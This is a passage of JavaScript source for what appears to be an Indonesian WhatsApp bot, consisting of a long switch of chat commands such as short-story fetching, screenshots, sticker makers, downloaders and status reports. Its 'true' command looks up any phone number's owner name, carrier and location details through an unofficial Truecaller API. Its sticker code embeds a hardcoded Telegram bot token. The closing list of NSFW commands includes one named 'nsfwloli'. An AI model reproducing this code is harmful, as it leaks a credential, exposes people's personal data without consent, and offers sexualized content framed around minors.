m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-cintasejati':{
let cerpe = await cerpen(`cinta sejati`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-galau':{
let cerpe = await cerpen(`galau`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-gokil':{
let cerpe = await cerpen(`gokil`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-inspiratif':{
let cerpe = await cerpen(`inspiratif`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-jepang':{
let cerpe = await cerpen(`jepang`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kehidupan':{
let cerpe = await cerpen(`kehidupan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-keluarga':{
let cerpe = await cerpen(`keluarga`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kisahnyata':{
let cerpe = await cerpen(`kisah nyata`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-korea':{
let cerpe = await cerpen(`korea`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-kristen':{
let cerpe = await cerpen(`kristen`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-liburan':{
let cerpe = await cerpen(`liburan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-malaysia':{
let cerpe = await cerpen(`malaysia`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-mengharukan':{
let cerpe = await cerpen(`mengharukan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-misteri':{
let cerpe = await cerpen(`misteri`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-motivasi':{
let cerpe = await cerpen(`motivasi`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasihat':{
let cerpe = await cerpen(`nasihat`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-nasionalisme':{
let cerpe = await cerpen(`nasionalisme`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-olahraga':{
let cerpe = await cerpen(`olahraga`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-patahhati':{
let cerpe = await cerpen(`patah hati`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penantian':{
let cerpe = await cerpen(`penantian`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pendidikan':{
let cerpe = await cerpen(`pendidikan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengalaman':{
let cerpe = await cerpen(`pengalaman pribadi`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-pengorbanan':{
let cerpe = await cerpen(`pengorbanan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-penyesalan':{
let cerpe = await cerpen(`penyesalan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perjuangan':{
let cerpe = await cerpen(`perjuangan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-perpisahan':{
let cerpe = await cerpen(`perpisahan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-persahabatan':{
let cerpe = await cerpen(`persahabatan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-petualangan':{
let cerpe = await cerpen(`petualangan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-ramadhan':{
let cerpe = await cerpen(`ramadhan`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-remaja':{
let cerpe = await cerpen(`remaja`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rindu':{
let cerpe = await cerpen(`rindu`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-rohani':{
let cerpe = await cerpen(`rohani`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-romantis':{
let cerpe = await cerpen(`romantis`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sastra':{
let cerpe = await cerpen(`sastra`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sedih':{
let cerpe = await cerpen(`sedih`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'cerpen-sejarah':{
let cerpe = await cerpen(`sejarah`)
m.reply(`⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`)
}
break
case 'ssweb': {
if (!args[0]) return m.reply(`Mana linknya, Example\n\nssweb api.lannn.me`)
try {
await Resta.sendMessage(m.chat, { image:{url:`${lannn}/api/tools/ssweb?device=phone&url=${args[0]}&apikey=${lannkey}`}, caption: `Kalau Mau yg Versi Desktop, Klik BUTTON Dibawah.`, buttons:[{buttonId: `sspc ${args[0]}`, buttonText: {displayText: 'Desktop'}, type: 1}]},{quoted:m})
} catch (err) {
  m.reply('Error')
}
}
  break
case 'sspc':{
await Resta.sendMessage(m.chat, { image:{url:`${lannn}/api/tools/ssweb?device=desktop&url=${args[0]}&apikey=${lannkey}`}, caption: `Nih Versi Desktop`},{quoted:m})
}
break
case 'gimage': {
        	try {
       if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(args.join(" "), async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)]
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images.url },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
 *Query* : ${text}
 *Media Url* : ${images.url}`,
                    footer: `GIMAGE`,
                    buttons: buttons,
                    headerType: 4
                }
                Resta.sendMessage(m.chat, { image: { url : image.url}, caption: `*-------「 GIMAGE SEARCH 」-------*
                *Query* : ${text}
                *Media Url* : ${images.url}` }, { quoted: m })
                })
                } catch (e) {
		        m.reply(mess.errmor)}
        }
        break
case 'true' : {
            if(!text && !text.startsWith("+")) return m.reply('Error : Please Give Correct Format number \n*Example :*.true +6281395861695')
             await Resta.sendMessage(m.chat, { react: { text: `🔍`, key: m.key }})
              await Resta.sendMessage(m.chat, { react: { text: `📞`, key: m.key }})
            const api = await fetchJson(`https://outrageous-fish-dress.cyclic.app/api/other/truecaller?number=${args[0]}`)
const msg = `${m.pushName} Your Number Truecaller Restarts


◈ Name: ${api.data.data[0].name}
◈ Access: ${api.data.data[0].access}
◈ Score: ${api.data.data[0].score}
◈ E164: ${api.data.data[0].phones[0].e164Format}
◈ National; ${api.data.data[0].phones[0].nationalFormat}
◈ D Code: ${api.data.data[0].phones[0].dialingCode}
◈ Country Code: ${api.data.data[0].phones[0].countryCode}
◈ Time Zone: ${api.data.data[0].addresses[0].timeZone}
◈ Company: ${api.data.data[0].phones[0].carrier}
◈ Type: ${api.data.data[0].phones[0].type}

© ${namaBot}`
const truei = await m.reply(msg)
 await Resta.sendMessage(m.chat, { react: { text: `📋`, key: truei.key }})
 await Resta.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
            }
            break
case 'qc':
case 'fakechat': {
					   let q = m.quoted ? m.quoted.text : text
					   if (q === "") return m.reply(`Input message:\n${command} hello world`);
                   let jsonnya = {
                     type: "quoted",
                     format: "webp",
                     backgroundColor: apiColor,
                     width: 768,
                     height: 768,
                     scale: 2,
                     messages: [
                   {
                   entities: [],
                   avatar: true,
                   from: {
                     id: 1,
                     name: await Resta.getName(m.quoted ? m.quoted.sender : m.sender),
                    photo: {
                      url: await Resta.profilePictureUrl(m.quoted ? m.quoted.sender : m.sender, 'image').catch(() => 'https://telegra.ph/file/999b290ecb3e50107a9da.jpg'),
                     }
                     },
                     text: q,
                     replyMessage: {},
                     },
                   ],
                 }
                 const post = await axios.post("https://bot.lyo.su/quote/generate",
                  jsonnya,{
                    headers: { "Content-Type": "application/json"},
                  })
                  let buff = Buffer.from(post.data.result.image, "base64")
                  if (buff == undefined) return m.reply('error')
                  Resta.sendImageAsSticker(m.chat, buff, mek, { packname, author })
}
                  break
case 'attp': {
if (!q) return m.reply('Mana Teksnya')
Resta.sendImageAsSticker(m.chat, `${lannn}/api/maker/attp?text=${q}&apikey=${lannkey}`, m, { packname: global.packname, author: global.author })
}
break
case 'ttp': {
const api = require('api-dylux');
  if (!text) throw m.reply(`Tolong berikan Text!\n\n*Example:* ${command} hai guys`)
  await m.reply(mess.wait)
  api.ttp(text)
    .then((res) => {
      return Resta.sendImageAsSticker(m.chat, res.result, m, { packname, author });
    })
    .catch((err) => {
      console.error(err);
    });    
    }
    break
case 'githubdl': {
if (!args[0]) throw m.reply('usernamenya mana om')
if (!args[1]) throw m.reply('repo nya mana?')
if (!args[2]) throw m.reply('masukkan nama branch')
let url = `https://github.com/${args[0]}/${args[1]}/archive/refs/heads/${args[2]}.zip`
//F
m.reply(`compressing data to file zip*`)
Resta.sendMessage(m.chat, { document : { url :url}, fileName: `${args[0]} ${args[1]}-${args[2]}.zip`, mimetype: 'zip', caption: `> Github: ${args[0]}\n> Repo: ${args[1]}\n> Branch: ${args[2]}`},{quoted:m})
}
break
case 'telestick':
case 'sticktele':
case 'telesticker': {
async function telegramStic(url) {
    let packName = url.replace("https://t.me/addstickers/", "")
    let resOne = await fetch(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, { method: "GET", headers: { "User-Agent": "GoogleBot" } })
    if (!resOne.ok) throw `${resOne.status} ${resOne.statusText}`
    let jsonOne = await resOne.json()
    let sticArr = []
    for (let i of jsonOne.result.stickers) {
        let fileId = i.thumb.file_id
        let resTwo = await fetch(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
        let jsonTwo = await resTwo.json()
        sticArr.push("https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + jsonTwo.result.file_path)
    }
    return {
        name: jsonOne.result.name,
        title: jsonOne.result.title,
        result: sticArr
    }
    }
if (!args || !args[0]) return m.reply(`Input URL:\n${command} https://t.me/addstickers/shironacry`);
    if (!args[0].match(/(https:\/\/t.me\/addstickers\/)/gi)) return m.reply(`Input URL:\n${usedPrefix + command} https://t.me/addstickers/twohundredthree`);
    let stik = await telegramStic(args[0])
    for (let sticker of stik.result) {
        const res = await fetch(sticker)
        let buff = Buffer.from(await res.arrayBuffer())
        //await m.reply( new MessageMedia((await fileTypeFromBuffer(buff)).mime, buff.toString("base64")), false, { sendMediaAsSticker: true, stickerName: `jamsut · alok`, stickerAuthor: 'efef', stickerCategories: ['😅'] } )
        await Resta.sendImageAsSticker(m.chat, buff, m, { packname: global.packname, author: global.author })
    }
    }
break
case 'c':
case 'getcase':
if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("./connect/resta.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
m.reply(`${getCase(q)}`)
break
case 'setppbot': {
            if (!isOwner && !m.key.fromMe) return m.reply(mess.botOwner)
            if (!quoted) return m.reply(`Kirim.reply Image Dengan Caption ${prefix + command}`)
            if (!/image/.test(mime)) return m.reply(`Kirim.reply Image Dengan Caption ${prefix + command}`)
            if (/webp/.test(mime)) return m.reply(`Kirim.reply Image Dengan Caption ${prefix + command}`)
            var media = await Resta.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
            var { img } = await generateProfilePicture(media)
            await Resta.query({
            tag: 'iq',
            attrs: {
            to: botNumber,
            type:'set',
            xmlns: 'w:profile:picture'
            },
            content: [
            {
            tag: 'picture',
            attrs: { type: 'image' },
            content: img
            }
            ]
            })
            fs.unlinkSync(media)
            m.reply(`Sukses`)
            }
                break
case 'getpic': {
if (qtod === "true") {
try {
pporg = await Resta.profilePictureUrl(m.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
Resta.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted : m })
} else if (qtod === "false") {
try {
pporgs = await Resta.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
Resta.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted : m })
}
}
break
case 'npmjs': {
            if (!q) return m.reply(`Kirim perintah ${prefix}npmjs *query*\nContoh: ${prefix}npmjs axios`)
            axios.get(`https://www.npmjs.com/search/suggestions?q=${q}`).then(x => {
                let listnpm = "*「 NPMJS-SEARCH 」*\n\n"
                for (let y = 0; y < x.data.length; y++) {
                    listnpm += `• *Name:* ${x.data[y].name}\n• *Scope:* ${x.data[y].scope}\n• *Publisher:* ${x.data[y].publisher.username}\n• *Link:* ${x.data[y].links.npm}\n• *Date:* ${x.data[y].date}\n• *Description:* ${x.data[y].description}\n\n`
                }
			Resta.sendMessage(from, {image: { url: "https://static.npmjs.com/5f6e93af5bf0f5dcdd1eecdac99f51ee.png"}, caption: listnpm.trim()}, {quoted:m})
            })
            }
            break
case 'sfile':
case 'sfilemobi': {
  if (args.length < 1) return m.reply('Linknya mana?')
	  try {
  let data = await fetchJson(`${lannn}/api/download/sfilemobi?url=${args[0]}&apikey=${lannkey}`)
      var capt = `Filename: ${data.result.filename}
Size: ${data.result.filesizeH}
Type: ${data.result.type}
Mimetype: ${data.result.mimetype}
      
Sebentar, Masih diproses!!!`
      Resta.sendMessage(m.chat, { text: capt }, { quoted: fwait })
      await Resta.sendMessage(m.chat, { document: { url: data.result.url }, mimetype: data.result.mimetype, fileName: data.result.filename }, { quoted: m })
	  } catch (err) {
      console.error(err)
      m.reply('Terjadi kesalahan saat memproses permintaan Anda.')
    }
}
  break
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!text) return m.reply(`Kirim.reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!m.quoted) return m.reply('Reply Image')
//if (text.includes('|')) return m.reply(`Kirim.reply Foto Dengan Caption ${prefix + command} *teks*`)
//if (!/image/.test(mime)) return m.reply(`Kirim.reply Foto Dengan Caption ${prefix + command} *teks*`)
arg = args.join(' ')
mee = await Resta.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('../lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = Resta.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
    fs.unlinkSync(memek)
}
break
case 'smeme2': {
	        let respond = `Kirim.reply image/sticker dengan caption ${prefix + command} text1|text2`
	        if (!/image/.test(mime)) return m.reply(respond)
            if (!text) return m.reply(respond)
	        m.reply(mess.wait)
            atas = text.split('|')[0] ? text.split('|')[0] : '-'
            bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	        let dwnld = await Resta.downloadAndSaveMediaMessage(quoted)
	        let { TelegraPh } = require('../lib/uploader')
	        let fatGans = await TelegraPh(dwnld)
	        let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans}`
	        let FaTiH = await Resta.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.auhor })
	        fs.unlinkSync(FaTiH)
            }
	       break
case 'brainly': {
            if (!q) m.reply(`Kirim perintah: ${prefix}brainly *soal*\nExample: ${prefix}brainly apa itu dpr`)
            const brainly = require('brainly-scraper')
            brainly(q, 8, "id").then(res => {
                let resultbrainly = `「 *BRAINLY-SEARCH* 」\n\n`
                for (let x = 0; x < res.data.length; x++) {
                    resultbrainly += `• *Soal:* ${res.data[x].pertanyaan}\n• *Jawaban:* ${res.data[x].jawaban[0].text.replace('Jawaban:', '').trim()}\n\n`
                }
                m.reply(resultbrainly.trim())
            })
            }
            break
case 'toimage': case 'toimg': {
if (!m.quoted) return m.reply('Reply sticker')
if (!/webp/.test(mime)) return m.reply(`balas stiker dengan caption *${prefix + command}*`)
m.reply(mess.wait)
let media = await Resta.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
Resta.sendMessage(m.chat, { image: buffer }, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'md':
case 'mediafire': {
if (args.length < 1) return m.reply('Link Nya Mana? ')
if(!isUrl(args[0]) && !args[0].includes('mediafire')) return m.reply(mess.Iv)
m.reply(mess.wait)
cok = args.join(' ')
res = await mediafireDl(cok)
result = `Media Fire Downloader

📌 *Nama :* ${res[0].nama}
📌 *Ukuran :* ${res[0].size}
📌 *Mimetype :* ${res[0].mime}
📌 *Link :* ${res[0].link}

_*Tunggu Proses Mengirim Media......⏳*_`
m.reply(result)
Resta.sendMessage(m.chat, {document: {url: res[0].link}, mimetype: res[0].mime, fileName: res[0].nama}, {quoted:m})
//sendMediaURL(res[0].link, { document, mimetype: res[0].mime, filename: res[0].nama }, { quoted: m })
}
break
case 'wa': {
	let wangsa = '0@s.whatsapp.net'
	Resta.sendMessage(m.chat, { text: `@${wangsa.split('@')[0]}`, mentions:[wangsa] }, { quoted: m })}
break
case 'tagme': {
Resta.sendMessage(m.chat, { text: `@${m.sender.split('@')[0]} Sayang 😘`, mentions:[m.sender] }, { quoted: m })
}
break
case 'speed':
case 'speedtest': {
            m.reply('Testing Speed...')
            let cp = require('child_process')
            let { promisify } = require('util')
            let exec = promisify(cp.exec).bind(cp)
          let o
          try {
          o = await exec('python3 speed.py --share')
          } catch (e) {
          o = e
         } finally {
        let { stdout, stderr } = o
        if (stdout.trim()) m.reply(stdout)
        if (stderr.trim()) m.reply(stderr)
            }
            }
            break
case 'ping': case 'botstatus': case 'statusbot': {
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
neww = performance.now()
oldd = performance.now()
respon = `Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`.trim()
Resta.relayMessage(m.chat, 
{ liveLocationMessage: {
  degreesLatitude: 0,
  degreesLongitude: 0,
  accuracyInMeters: 0,
degreesClockwiseFromMagneticNorth: 2,
caption: respon,
sequenceNumber: 2,
timeOffset: 3,
jpegThumbnail: await (await fetch('https://telegra.ph/file/3911d7aaaa8733314f70f.png')).buffer(), 
contextInfo:{externalAdReply:{showAdAttribution: true}},
}}, {})
}
break
// WEBZONE API //
case 'gsmarena': {
if (!text) return m.reply(`merk hpnya apa su?`)
let hape = await fetchJson(`${lannn}/api/webzone/gsmarena?query=${text}&apikey=${lannkey}`)
let spek = hape.result.result
txet = `Judul: ${spek.judul}
Rilis: ${spek.rilis}
Ukuran: ${spek.ukuran}
Type: ${spek.type}
Storage: ${spek.storage}
Display: ${spek.display}
Pixel: ${spek.pixel}
Inchi: ${spek.inchi}
Video Pixel: ${spek.videoPixel}
Ram: ${spek.ram}
Chipset: ${spek.chipset}
Baterai: ${spek.batrai}
Merk Baterai: ${spek.merk_batre}
Detail: ${spek.detail}`
Resta.sendMessage(m.chat, { image: { url : spek.thumb}, caption: txet},{quoted:m})
}
break
case 'gempa': {
let bumi = await fetchJson(`${lannn}/api/webzone/gempa?apikey=${lannkey}`)
let imub = bumi.result
txeet = `Waktu: ${imub.Waktu}
Lintang: ${imub.Lintang}
Bujur: ${imub.Bujur}
Magnitudo: ${imub.Magnitudo}
Kedalaman: ${imub.Kedalaman}
Wilayah: ${imub.Wilayah}
Map: ${imub.Map}`
Resta.sendMessage(m.chat, { image: { url: imub.Map }, caption: txeet }, {quoted:m})
}
break
//alok//
case 'ahegao':
case 'ass':
case 'bdsm':
case 'blowjob':
case 'cuckold':
case 'cum':
case 'eba':
case 'ero':
case 'fendom':
case 'foot':
case 'gangbang':
case 'glasses':
case 'hentai':
case 'jahy':
case 'manga':
case 'masturbation':
case 'megumin':
case 'neko':
case 'neko2':
case 'nekonime':
case 'nsfw':
case 'nsfwloli':
case 'nsfwmanga':
case 'nsfwneko':
case 'orgy':
case 'panties':
